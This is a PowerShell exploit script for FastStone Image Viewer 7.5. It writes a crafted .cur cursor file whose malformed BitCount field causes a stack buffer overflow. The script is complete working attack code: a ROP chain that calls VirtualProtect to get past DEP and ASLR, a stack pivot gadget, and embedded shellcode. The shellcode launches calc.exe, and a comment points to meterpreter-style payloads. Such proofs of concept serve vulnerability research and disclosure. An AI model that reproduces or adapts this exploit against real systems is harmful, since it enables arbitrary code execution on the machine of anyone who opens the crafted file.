# Exploit title: FastStone Image Viewer 7.5 - .cur BITMAPINFOHEADER 'BitCount' Stack Based Buffer Overflow (ASLR & DEP Bypass)
# Exploit Author: Paolo Stagno
# Date: 15/03/2020
# Vendor Homepage: https://www.faststone.org/
# Download: https://www.faststonesoft.net/DN/FSViewerSetup75.exe
#                    https://github.com/VoidSec/Exploit-Development/tree/master/windows/x86/local/FastStone_Image_Viewer_v.7.5/
# Version: 7.5
# Tested on: Windows 10 Pro x64 v.1909 Build 18363.1256
# Category: local exploit
# Platform: windows
# Porting by FabioDefilippo

# Module info :
#----------------------------------------------------------------------------------------------------------------------
#Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
#----------------------------------------------------------------------------------------------------------------------
#0x00400000 | 0x00abf000 | 0x006bf000 | False  | False   | False |  False   | False  | 7.5.0.0 [FSViewer.exe] (C:\Program Files (x86)\FastStone Image Viewer\FSViewer.exe)
#0x6ad80000 | 0x6adfe000 | 0x0007e000 | False  | False   | False |  False   | False  | -1.0- [fsplugin05.dll] (C:\Program Files (x86)\FastStone Image Viewer\fsplugin05.dll)
#0x6afb0000 | 0x6b011000 | 0x00061000 | True   | True    | False |  False   | False  | -1.0- [fsplugin06.dll] (C:\Program Files (x86)\FastStone Image Viewer\fsplugin06.dll)
#----------------------------------------------------------------------------------------------------------------------

write-host "`n[>] FastStone Image Viewer v. <= 7.5 Exploit by VoidSec`n";

$filename="\FSViewer_v.7.5_exploit.cur";

###################################################################################
# Shellcode
# MAX Shellcode size: 556
# ImageData - ROP NOP - Rop Chain - Stack Adjustment = 776 - 144 - 68 - 8 = 556
# Custom calc.exe shellcode
# size: 112
###################################################################################

$shellcode=0x31, 0xdb, 0x64, 0x8b, 0x7b, 0x30, 0x8b, 0x7f,
    0x0c, 0x8b, 0x7f, 0x1c, 0x8b, 0x47, 0x08, 0x8b,
    0x77, 0x20, 0x8b, 0x3f, 0x80, 0x7e, 0x0c, 0x33,
    0x75, 0xf2, 0x89, 0xc7, 0x03, 0x78, 0x3c, 0x8b,
    0x57, 0x78, 0x01, 0xc2, 0x8b, 0x7a, 0x20, 0x01,
    0xc7, 0x89, 0xdd, 0x8b, 0x34, 0xaf, 0x01, 0xc6,
    0x45, 0x81, 0x3e, 0x43, 0x72, 0x65, 0x61, 0x75,
    0xf2, 0x81, 0x7e, 0x08, 0x6f, 0x63, 0x65, 0x73,
    0x75, 0xe9, 0x8b, 0x7a, 0x24, 0x01, 0xc7, 0x66,
    0x8b, 0x2c, 0x6f, 0x8b, 0x7a, 0x1c, 0x01, 0xc7,
    0x8b, 0x7c, 0xaf, 0xfc, 0x01, 0xc7, 0x89, 0xd9,
    0xb1, 0xff, 0x53, 0xe2, 0xfd, 0x68, 0x63, 0x61,
    0x6c, 0x63, 0x89, 0xe2, 0x52, 0x52, 0x53, 0x53,
    0x53, 0x53, 0x53, 0x53, 0x52, 0x53, 0xff, 0xd7;


if ($shellcode.Length  -gt 556){
    write-host "Shellcode's size must be <= 556 bytes";
    exit;
}

###################################################################################
# Cur File Format
# ---------------------------------------------------------------------------------
# | Reserved | Type  | Image Count |
# | 00 00    | 02 00 | 02 00       | <- CUR file will contains two images
# Entries:
# | Width | Height | ColorCount | Reserved | XHotSpot | YHotSpot | SizeInBytes | File Offset |
# | 30    | 30     | 00         | 00       | 01 00    | 02 00    | 30 03 00 00 | 26 00 00 00 | <- we'll corrupt the first image with rop chain & shellcode
# | 20    | 20     | 00         | 00       | 02 00    | 04 00    | E8 02 00 00 | 56 03 00 00 | <- while leaving the 2nd one "untouched" a part from the stack pivot (should leave the cursor preview intact)
# 1st Image Info Header:
# | Size        | Width       | Height      | Planes | BitCount | Compression | ImageSize   | XpixelsPerM | YpixelsPerM | Colors Used | ColorsImportant |
# | 28 00 00 00 | 30 00 00 00 | 60 00 00 00 | 01 00  | 89 30    | 00 00 00 00 | 00 00 00 00 | 00 00 00 00 | 00 00 00 00 | 00 00 00 00 | 00 00 00 00     |
# 1st ImageData(BLOB)
# 2nd Image Info Header:
# 2nd ImageData(BLOB)
# ---------------------------------------------------------------------------------
# BitCount will be used to read # number of bytes into a buffer triggering the buffer overflow
# its value can be modified but we need to account for two operations happening into the software.
# - SHL 1, 89 = 0x200
# - SHL 200, 2 = 0x800 (2048d) number of bytes to be read from the file
# we'll have to pad the image data to match it's size in bytes defined in the header SizeInBytes
# ImageData = SizeInBytes - ImageInfoHeader Size (330h-28h=308h 776d)
###################################################################################

$image_data_pad = 776;

function create_rop_nop{
    $rop_gadgets = 0x6adc5ab6; # 0x6adc5ab6 (RVA : 0x00045ab6) : # DEC ECX # RETN    ** [fsplugin05.dll] **   |   {PAGE_EXECUTE_READ}
    return (0xb6, 0x5a, 0xdc, 0x6a);
}

function create_rop_chain{
    [Byte[]]$rop_gadgets = 
        #[---INFO:gadgets_to_set_esi:---]
        0xd4, 0x5b, 0x40, 0x00,  # POP EAX ; RETN [FSViewer.exe]
        0x60, 0x41, 0xdf, 0x6a,  # ptr to &VirtualProtect() [IAT fsplugin05.dll]
        0x77, 0x39, 0x8b, 0x00,  # MOV EAX,DWORD PTR DS:[EAX] ; RETN [FSViewer.exe]
        0x7a, 0xf6, 0x83, 0x00,  # XCHG EAX,ESI ; RETN [FSViewer.exe]
        #[---INFO:gadgets_to_set_ebp:---]
        0xb8, 0x35, 0x5b, 0x00,  # POP EBP ; RETN [FSViewer.exe]
        0x21, 0x45, 0x45, 0x00,  # & jmp esp [FSViewer.exe]
        #[---INFO:gadgets_to_set_ebx:---]
        0x72, 0x04, 0x63, 0x00,  # POP EBX ; RETN [FSViewer.exe]
        0x01, 0x02, 0x00, 0x00,  # 0x00000201-> ebx
        #[---INFO:gadgets_to_set_edx:---]
        0xdb, 0x98, 0x47, 0x00,  # POP EDX ; RETN [FSViewer.exe]
        0x40, 0x00, 0x00, 0x00,  # 0x00000040-> edx
        #[---INFO:gadgets_to_set_ecx:---]
        0x32, 0x78, 0x4c, 0x00,  # POP ECX ; RETN [FSViewer.exe]
        0x45, 0x14, 0x99, 0x00,  # &Writable location [FSViewer.exe]
        #[---INFO:gadgets_to_set_edi:---]
        0xa8, 0xc3, 0x40, 0x00,  # POP EDI ; RETN [FSViewer.exe]
        0x0b, 0x66, 0x57, 0x00,  # RETN (ROP NOP) [FSViewer.exe]
        #[---INFO:gadgets_to_set_eax:---]
        0x43, 0x42, 0x40, 0x00,  # POP EAX ; RETN [FSViewer.exe]
        0x90, 0x90, 0x90, 0x90,  # nop
        #[---INFO:pushad:---]
        0xbf, 0x21, 0xdc, 0x6a;  # PUSHAD # RETN [fsplugin05.dll]

    return $rop_gadgets;
}
# Cur image = 1597 bytes
###################################################################################
$cur_Signature = 0x00, 0x00, 0x02, 0x00, 0x02, 0x00; # | Reserved | Type  | Image Count |
$cur_Entries = 0x30, 0x30, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x30, 0x03, 0x00, 0x00, 0x26, 0x00, 0x00, 0x00,  # 1st Entry
               0x20, 0x20, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00, 0xE8, 0x02, 0x00, 0x00, 0x56, 0x03, 0x00, 0x00;  # 2nd Entry

# 1st Image Info Header
$cur_1InfoHeader = 0x28, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x01, 0x00, 0x89, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00;
# 1st ImageData
# cur_1ImageData_orig = ", 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x41, 0x00, 0x1F, 0x80, 0x00, 0x00, 0x00, 0xC0, 0x41, 0x00, 0x3F, 0xC0, 0x00, 0x00, 0x00, 0xA0, 0x82, 0x00, 0x3F, 0xC0, 0x00, 0x00, 0x00, 0x90, 0x82, 0x00, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x89, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x85, 0x04, 0x00, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x82, 0x08, 0x00, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x80, 0x0F, 0xFE, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x04, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x08, 0x0F, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x10, 0x07, 0xC0, 0x00, 0x00, 0x00, 0x80, 0x00, 0x20, 0x03, 0xE0, 0x00, 0x00, 0x00, 0x80, 0x00, 0x47, 0xC1, 0xF0, 0x00, 0x00, 0x00, 0x80, 0x00, 0x87, 0xC1, 0xF8, 0x00, 0x00, 0x00, 0x80, 0x01, 0x07, 0xC1, 0xFC, 0x00, 0x00, 0x00, 0x80, 0x02, 0x07, 0xC1, 0xFC, 0x00, 0x00, 0x00, 0x80, 0x04, 0x07, 0xC1, 0xFC, 0x00, 0x00, 0x00, 0x80, 0x08, 0x07, 0xC1, 0xFC, 0x00, 0x00, 0x00, 0x80, 0x10, 0x07, 0xE3, 0xFC, 0x00, 0x00, 0x00, 0x80, 0x20, 0x03, 0xFF, 0xF8, 0x00, 0x00, 0x00, 0x80, 0x40, 0x01, 0xFF, 0xF0, 0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0xFF, 0xE0, 0x00, 0x00, 0x00, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xF8, 0x3F, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xF0, 0x1F, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xF0, 0x1F, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xE0, 0x3F, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xE0, 0x3F, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xC0, 0x7F, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xC0, 0x7F, 0xE0, 0x7F, 0xFF, 0x00, 0x00, 0x7F, 0x80, 0xFF, 0xC0, 0x3F, 0xFF, 0x00, 0x00, 0x3F, 0x80, 0xFF, 0x80, 0x1F, 0xFF, 0x00, 0x00, 0x1F, 0x01, 0xFF, 0x80, 0x1F, 0xFF, 0x00, 0x00, 0x0F, 0x01, 0xFF, 0xC0, 0x3F, 0xFF, 0x00, 0x00, 0x06, 0x03, 0xFF, 0xE0, 0x7F, 0xFF, 0x00, 0x00, 0x02, 0x03, 0xFF, 0xC0, 0x3F, 0xFF, 0x00, 0x00, 0x00, 0x07, 0xFF, 0xC0, 0x3F, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x01, 0xC0, 0x3F, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x03, 0xC0, 0x3F, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x07, 0xE0, 0x3F, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xF0, 0x1F, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x10, 0x18, 0x0F, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x30, 0x1C, 0x07, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x70, 0x1C, 0x03, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x1C, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x01, 0xF0, 0x1C, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x03, 0xF0, 0x1C, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x07, 0xF0, 0x1C, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x0F, 0xF0, 0x00, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x03, 0xFF, 0x00, 0x00, 0x00, 0x3F, 0xFC, 0x00, 0x07, 0xFF, 0x00, 0x00, 0x00, 0x7F, 0xFE, 0x00, 0x0F, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x1F, 0xFF, 0x00, 0x00, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x0F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x1F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x3F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00"
write-host "Generating 1st ImageData BLOB:";
$cur_1ImageData = create_rop_nop;
for($I = 0; $I -lt ( (1560 - 1416 ) / 4 ) -1;$I++){
    $cur_1ImageData += create_rop_nop; # 1560 stack pivot - 1416 where our cyclic pattern has been found
}

write-host "- ROP NOP:`t`t" $cur_1ImageData.Length;
$cur_1ImageData += create_rop_chain ;
write-host "- ROP Chain:`t`t" (create_rop_chain).Length;
$cur_1ImageData += 0x81, 0xC4, 0x44, 0xFD, 0xFF, 0xFF, 0x90, 0x90;               # stack adjustment for meterpreter GetPC routine: add esp, -700
write-host "- Stack Adjustment:`t8";
$cur_1ImageData += $shellcode;
write-host "- Shellcode:`t`t" $shellcode.Length;
$cur_1ImageData += [System.Text.Encoding]::ASCII.GetBytes("A" * ($image_data_pad - $cur_1ImageData.Length));
# 2nd Image Info Header
$cur_2InfoHeader = 0x28, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00;
# 2nd ImageData (if this does not trigger the stack pivot it should be changed removing the beginning , 0x00 byte of cur_2ImageData2 and adding it back at the end of cur_2ImageData section)
$cur_2ImageData = 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x80, 0x00, 0x80, 0x80, 0x00, 0x00, 0xC0, 0xC0, 0xC0, 0x00, 0x80, 0x80, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x1F, 0xFF, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x00, 0xF1, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x00, 0xF1, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x1F, 0x00, 0x0F, 0x11, 0x11, 0x11, 0x10, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x1F, 0x00, 0x0F, 0x11, 0x11, 0x11, 0x0F, 0xFF, 0x01, 0x11, 0x11, 0x11, 0x11, 0xF1, 0x11, 0x11, 0xF0, 0x00, 0xF1, 0x11, 0x11, 0x10, 0xFF, 0xFF, 0xF0, 0x11, 0x11, 0x11, 0x11, 0xFF, 0x11, 0x11, 0xF0, 0x00, 0xF1, 0x11, 0x11, 0x11, 0x0F, 0xFF, 0x01, 0x11, 0x11, 0x11, 0x11, 0xF0, 0xF1, 0x1F, 0x00, 0x0F, 0x11, 0x11, 0x11, 0x11, 0x10, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x0F, 0x1F, 0x00, 0x0F, 0x11, 0x11, 0x11, 0x11, 0x0F, 0xFF, 0x01, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x00, 0xF0, 0x00, 0xF1, 0x11, 0x11, 0x11, 0x11, 0x0F, 0xFF, 0x01, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xF1, 0x11, 0x0F, 0xFF, 0x01, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x11, 0x11, 0x10, 0xFF, 0xF0, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF1, 0x00, 0x00, 0x01, 0x0F, 0xFF, 0x01, 0x11, 0x11, 0x11, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x11, 0x0F, 0xFF, 0x01, 0x10, 0xFF, 0xF0, 0x11, 0x11, 0x11, 0xF0, 0x00, 0x00, 0x00, 0x00, 0xF1, 0x11, 0x0F, 0xFF, 0x01, 0x10, 0xFF, 0xFF, 0x01, 0x11, 0x11, 0xF0, 0x00, 0x00, 0x00, 0x0F, 0x11, 0x11, 0x0F, 0xFF, 0x01, 0x10, 0xFF, 0xFF, 0x01, 0x11, 0x11, 0xF0, 0x00, 0x00, 0x00, 0xF1, 0x11, 0x11, 0x0F, 0xFF, 0x01, 0x10, 0xFF, 0xFF, 0x01, 0x11, 0x11, 0xF0, 0x00, 0x00;
# SEH record overwrite goes here
$cur_2ImageData2 = 0x00, 0xFF, 0xF0, 0x0F, 0xFF, 0xF0, 0x11, 0x11, 0x11, 0xF0, 0x00, 0x00, 0xF1, 0x11, 0x11, 0x11, 0x11, 0x0F, 0xFF, 0xFF, 0xFF, 0x01, 0x11, 0x11, 0x11, 0xF0, 0x00, 0x0F, 0x11, 0x11, 0x11, 0x11, 0x11, 0x10, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x00, 0xF1, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xF0, 0x0F, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xF0, 0xF1, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xFF, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xF1, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE3, 0xFF, 0xFF, 0xFF, 0xC1, 0xFF, 0xFF, 0xFF, 0xC1, 0xFF, 0xFF, 0xFF, 0x83, 0xF8, 0xFF, 0xFF, 0x83, 0xF0, 0x7F, 0xDF, 0x07, 0xE0, 0x3F, 0xCF, 0x07, 0xF0, 0x7F, 0xC6, 0x0F, 0xF8, 0xFF, 0xC2, 0x0F, 0xF0, 0x7F, 0xC0, 0x1F, 0xF0, 0x7F, 0xC0, 0x00, 0x70, 0x7F, 0xC0, 0x00, 0xF8, 0x3F, 0xC0, 0x01, 0x04, 0x1F, 0xC0, 0x03, 0x06, 0x0F, 0xC0, 0x07, 0x06, 0x07, 0xC0, 0x0F, 0x06, 0x07, 0xC0, 0x1F, 0x06, 0x07, 0xC0, 0x3F, 0x80, 0x0F, 0xC0, 0x7F, 0xC0, 0x1F, 0xC0, 0xFF, 0xE0, 0x3F, 0xC1, 0xFF, 0xFF, 0xFF, 0xC3, 0xFF, 0xFF, 0xFF, 0xC7, 0xFF, 0xFF, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF;
###################################################################################

$buf = $cur_Signature;
$buf += $cur_Entries;
$buf += $cur_1InfoHeader;
$buf += $cur_1ImageData;
$buf += $cur_2InfoHeader;
$buf += $cur_2ImageData;
# buf += struct.pack('<I',0x004023da) # SEH pop ecx ; pop ebp ; ret  | startnull {PAGE_EXECUTE_READ} [FSViewer.exe]
# 0x0019dc10 : Pointer into normal cyclic pattern at ESP+0x588 (+1416) : 0x0019dc48 : offset 1, length 775
$buf += 0xff, 0xd2, 0xda, 0x6a; # stack pivot 1560 / 0x618 :  ADD ESP,608 ; POP EBX ; POP ESI ; POP EDI ; POP EBP ; RETN    ** [fsplugin05.dll] **   |   {PAGE_EXECUTE_READ}
$buf += $cur_2ImageData2;

#buf += "B" * (buf_max_size - len(buf))
write-host "`nWriting CUR File:";
write-host "--------------------------------------------------------";
write-host "- Signature + ImageCount:`t" $cur_Signature.Length;
write-host "- Entries 2/2:`t`t`t" $cur_Entries.Length;
write-host "- 1st InfoHeader:`t`t" $cur_1InfoHeader.Length;
write-host "- 1st ImageData:`t`t" $cur_1ImageData.Length;
write-host "- 2nd InfoHeader:`t`t" $cur_2InfoHeader.Length;
write-host "  2nd ImageData 1/2:`t" $cur_2ImageData.Length;
write-host "  SEH:`t`t`t4";
write-host "  2nd ImageData 2/2:`t" $cur_2ImageData2.Length;
write-host "- 2nd ImageData TOT:`t`t" ($cur_2ImageData.Length+4+$cur_2ImageData2.Length);
write-host "--------------------------------------------------------";
write-host "[+] Writing total "$buf.Length" bytes on";

[io.file]::WriteAllBytes($PWD.Path + $filename, $buf);